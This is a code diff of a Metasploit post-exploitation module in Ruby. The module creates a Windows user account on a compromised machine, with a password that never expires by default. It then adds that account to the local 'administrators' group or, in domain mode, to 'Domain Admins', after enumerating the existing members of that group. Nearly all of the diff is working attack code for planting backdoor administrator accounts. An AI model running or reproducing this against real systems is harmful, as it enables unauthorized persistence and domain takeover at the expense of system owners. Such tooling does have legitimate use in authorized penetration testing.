@@ -5,6 +5,10 @@
 
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Accounts
+  include Msf::Post::Windows::Priv
+  include Msf::Exploit::Deprecated
+
+  # moved_from 'post/windows/manage/add_user_domain'
 
   def initialize(info={})
     super( update_info( info,
@@ -33,8 +37,10 @@ class MetasploitModule < Msf::Post
       [
         OptString.new('USERNAME',        [ true,  'The username of the user to add (not-qualified, e.g. BOB)' ]),
         OptString.new('PASSWORD',        [ false, 'The password of the user account to be created' ]),
-        OptString.new('SERVER_NAME',     [ false, 'DNS or NetBIOS name of remote server on which to add user' ]),
-        OptBool.new(  'DONT_EXPIRE_PWD', [ false, 'Set to true to toggle the "Password never expires" flag on account', false ]),
+        OptString.new('SERVER_NAME', [ false, 'DNS or NetBIOS name of remote server on which to add user, e.g. \\\\XXX.kali-team.cn']),
+        OptString.new('GROUP',   [ false, 'The local group to which the specified users or global groups will be added.(if it not exists)']),
+        OptBool.new('DONT_EXPIRE_PWD', [ false, 'Set to true to toggle the "Password never expires" flag on account', true ]),
+        OptBool.new('ADD_TO_DOMAIN', [true,  'Add to Domain if true, Add to Local if false', false]),
       ])
   end
 
@@ -61,68 +67,208 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  def run
-    addr_username    = alloc_and_write_str(datastore['USERNAME'])
-    addr_password     = alloc_and_write_str(datastore['PASSWORD'])
-    dont_expire_pwd = datastore['DONT_EXPIRE_PWD']
-
-    if addr_username.nil? || addr_password.nil?
-      return nil
-    end
-
-    acct_flags = 'UF_SCRIPT | UF_NORMAL_ACCOUNT'
-    if dont_expire_pwd
-      acct_flags << ' | UF_DONT_EXPIRE_PASSWD'
-    end
-
-    #  Set up the USER_INFO_1 structure.
-    #  https://docs.microsoft.com/en-us/windows/win32/api/Lmaccess/ns-lmaccess-user_info_1
-    user_info = [
-      addr_username,
-      addr_password,
-      0x0,
-      0x1,
-      0x0,
-      0x0,
-      client.railgun.const(acct_flags),
-      0x0
-    ].pack("VVVVVVVV")
-
-    #  Netlocalgroupadd work, I tried to call NetLocalGroupAddMembers, but that didn't work either...
-    #  I don't know what happened!
-
-    # localgroup_info = [ #  LOCALGROUP_INFO_1
-    # 	addr_localgroup, #  lgrpi1_name
-    # 	0x0 #  lgrpi1_comment
-    # ].pack("VV")
-
-    # localgroup_members = [ #  LOCALGROUP_MEMBERS_INFO_3
-    # 	addr_username, #  lgrmi3_domainandname
-    # ].pack("V")
-
-    # add_localgroup(datastore['SERVER_NAME'], localgroup_info)
-    # add_members_localgroup(datastore['SERVER_NAME'], datastore['LOCALGROUP'], localgroup_members)
-
-    add_user_result = add_user(datastore['SERVER_NAME'], user_info)
-    case add_user_result
-    when :success
-      print_good 'User was added!'
-    when :user_exists
-      print_error 'User already exists.'
-    when :group_exists
-      print_error 'Group already exists.'
-    when :access_denied
+  def check_result(user_result)
+    case user_result['return']
+    when client.railgun.const('ERROR_ACCESS_DENIED')
       print_error 'Sorry, you do not have permission to add that user.'
-    when :invalid_server
+    when client.railgun.const('NERR_UserExists')
+      print_status 'User already exists.'
+    when client.railgun.const('NERR_GroupExists')
+      print_status 'Group already exists.'
+    when client.railgun.const('NERR_UserNotFound')
+      print_error 'The user name could not be found.'
+    when client.railgun.const('NERR_InvalidComputer')
       print_error 'The server you specified was invalid.'
-    when :not_on_primary
+    when client.railgun.const('NERR_NotPrimary')
       print_error 'You must be on the primary domain controller to do that.'
-    when :invalid_password
+    when client.railgun.const('NERR_GroupNotFound')
+      print_error 'The local group specified by the groupname parameter does not exist.'
+    when client.railgun.const('NERR_PasswordTooShort')
       print_error 'The password does not appear to be valid (too short, too long, too recent, etc.).'
-    when nil
-      print_error 'Something horrible just happened. Sorry.'
+    when client.railgun.const('ERROR_ALIAS_EXISTS')
+      print_status 'The local group already exists.'
+    when client.railgun.const('NERR_UserInGroup')
+      print_status 'The user already belongs to this group.'
+    when client.railgun.const('ERROR_MORE_DATA')
+      print_status 'More entries are available. Specify a large enough buffer to receive all entries.'
+    when client.railgun.const('ERROR_NO_SUCH_ALIAS')
+      print_status 'The specified account name is not a member of the local group.'
+    when client.railgun.const('ERROR_NO_SUCH_MEMBER')
+      print_status 'One or more of the members specified do not exist. Therefore, no new members were added.).'
+    when client.railgun.const('ERROR_MEMBER_IN_ALIAS')
+      print_status 'One or more of the members specified were already members of the local group. No new members were added.'
+    when client.railgun.const('ERROR_INVALID_MEMBER')
+      print_status 'One or more of the members cannot be added because their account type is invalid. No new members were added.'
+    when client.railgun.const('RPC_S_SERVER_UNAVAILABLE')
+      print_status 'The RPC server is unavailable.'
     else
-      print_error 'This module is out of date.'
+      error = user_result['GetLastError']
+      print_error "Unexpectedly returned #{user_result}"
     end
+  end
+
+def local_mode()
+  if datastore['GROUP'] == nil
+    datastore['GROUP'] = 'administrators'
+    print_status("You have not set up a group. The default is '#{datastore['GROUP']}' " )
+  end
+  addr_username    = alloc_and_write_str(datastore['USERNAME'])
+  addr_password     = alloc_and_write_str(datastore['PASSWORD'])
+  addr_group   = alloc_and_write_str(datastore['GROUP'])
+  dont_expire_pwd = datastore['DONT_EXPIRE_PWD']
+  if addr_username.nil? || addr_password.nil?
+    return nil
+  end
+  acct_flags = 'UF_SCRIPT | UF_NORMAL_ACCOUNT'
+  if dont_expire_pwd
+    acct_flags << ' | UF_DONT_EXPIRE_PASSWD'
+  end
+  #  Set up the USER_INFO_1 structure.
+  #  https://docs.microsoft.com/en-us/windows/win32/api/Lmaccess/ns-lmaccess-user_info_1
+  user_info = [
+    addr_username,
+    addr_password,
+    0x0,
+    0x1,
+    0x0,
+    0x0,
+    client.railgun.const(acct_flags),
+    0x0
+  ].pack("VVVVVVVV")
+  #  Add user
+  result = add_user(datastore['SERVER_NAME'], user_info)
+  if result['return'] == 0
+    print_good("User '#{datastore['USERNAME']}' was added!")
+  else
+    check_result(result)
+  end
+  #  Add localgroup if it not exists
+  #  Set up the #  LOCALGROUP_INFO_1 structure.
+  localgroup_info = [
+    addr_group, #  lgrpi1_name
+    0x0 #  lgrpi1_comment
+  ].pack("VV")
+  result = add_localgroup(datastore['SERVER_NAME'], localgroup_info)
+  if result['return'] == 0
+    print_good("Group '#{datastore['GROUP']}'  was added!")
+  else
+    check_result(result)
+  end
+  #  Add Member to LocalGroup
+  #  Set up the LOCALGROUP_MEMBERS_INFO_3 structure.
+  localgroup_members = [
+    addr_username, #  lgrmi3_domainandname
+  ].pack("V")
+  result = add_members_localgroup(datastore['SERVER_NAME'], datastore['GROUP'], localgroup_members)
+  if result['return'] == 0
+    print_good("'#{datastore['USERNAME']}' is now a member of the '#{datastore['GROUP']}' group!")
+  else
+    check_result(result)
+  end
+  # free memory
+  client.railgun.multi([
+    ["kernel32", "VirtualFree", [addr_username, 0, MEM_RELEASE]], #  addr_username
+    ["kernel32", "VirtualFree", [addr_password, 0, MEM_RELEASE]],  #  addr_password
+    ["kernel32", "VirtualFree", [addr_group, 0, MEM_RELEASE]], #  addr_group
+  ])
+end
+
+def domain_mode()
+  ## enum domain
+  domain = get_domain()
+  if domain
+    # primary_domain = domain.split('.')[0].upcase.to_s
+    print_good("Found Domain : #{domain}")
+  else
+    print_error("Oh, Domain server not found.")
+    return false
+  end
+  unless is_admin?
+    print_error("You don't have enough privileges. Try getsystem.")
+    return false
+  end
+  privs = session.sys.config.getprivs
+  if privs.include?("SeIncreaseQuotaPrivilege")
+    print_good("Has pass the priv check")
+  else
+    print_error("Abort! Did not pass the priv check")
+    return false
+  end
+  if datastore['GROUP'] == nil
+    datastore['GROUP'] = 'Domain Admins'
+    print_status("You have not set up a group. The default is '#{datastore['GROUP']}' " )
+  end
+  addr_username    = alloc_and_write_str(datastore['USERNAME'])
+  addr_password     = alloc_and_write_str(datastore['PASSWORD'])
+  addr_group   = alloc_and_write_str(datastore['GROUP'])
+  domain_admins = get_members_from_group(datastore['SERVER_NAME'], datastore['GROUP'])
+  if domain_admins
+    print_good("Domain Group Members:"<<domain_admins.to_s)
+  end
+  dont_expire_pwd = datastore['DONT_EXPIRE_PWD']
+  if addr_username.nil? || addr_password.nil?
+    return nil
+  end
+  acct_flags = 'UF_SCRIPT | UF_NORMAL_ACCOUNT'
+  if dont_expire_pwd
+    acct_flags << ' | UF_DONT_EXPIRE_PASSWD'
+  end
+  #  Set up the USER_INFO_1 structure.
+  #  https://docs.microsoft.com/en-us/windows/win32/api/Lmaccess/ns-lmaccess-user_info_1
+  user_info = [
+    addr_username,
+    addr_password,
+    0x0,
+    0x1,
+    0x0,
+    0x0,
+    client.railgun.const(acct_flags),
+    0x0
+  ].pack("VVVVVVVV")
+  #  Add user
+  result = add_user(datastore['SERVER_NAME'], user_info)
+  if result['return'] == 0
+    print_good("User '#{datastore['USERNAME']}' was added!")
+  else
+    check_result(result)
+  end
+  #  https://docs.microsoft.com/zh-cn/windows/win32/api/lmaccess/ns-lmaccess-group_info_1
+  # Set up the GROUP_INFO_1 structure.
+  group_info_1 = [
+    addr_group,
+    0x0
+  ].pack("VV")
+  #  Add localgroup if it not exists
+  result = add_group(datastore['SERVER_NAME'], group_info_1)
+  if result['return'] == 0
+    print_good("Group '#{datastore['GROUP']}'  was added!")
+  else
+    check_result(result)
+  end
+  # Add member to domain group
+  result = add_members_group(datastore['SERVER_NAME'], datastore['GROUP'], datastore['USERNAME'])
+  if result['return'] == 0
+    print_good("'#{datastore['USERNAME']}' is now a member of the '#{datastore['GROUP']}' group!")
+  else
+    check_result(result)
+  end
+  # free memory
+  client.railgun.multi([
+    ["kernel32", "VirtualFree", [addr_username, 0, MEM_RELEASE]], #  addr_username
+    ["kernel32", "VirtualFree", [addr_password, 0, MEM_RELEASE]],  #  addr_password
+    ["kernel32", "VirtualFree", [addr_group, 0, MEM_RELEASE]],          #  addr_group
+  ])
+end
+
+  def run
+    print_status("Running module on '#{sysinfo['Computer']}'")
+    if datastore["ADD_TO_DOMAIN"]
+      print_status("Domain Mode")
+      domain_mode()
+    else
+      print_status("Local Mode")
+      local_mode()
+    end
+  return nil
   end
 end
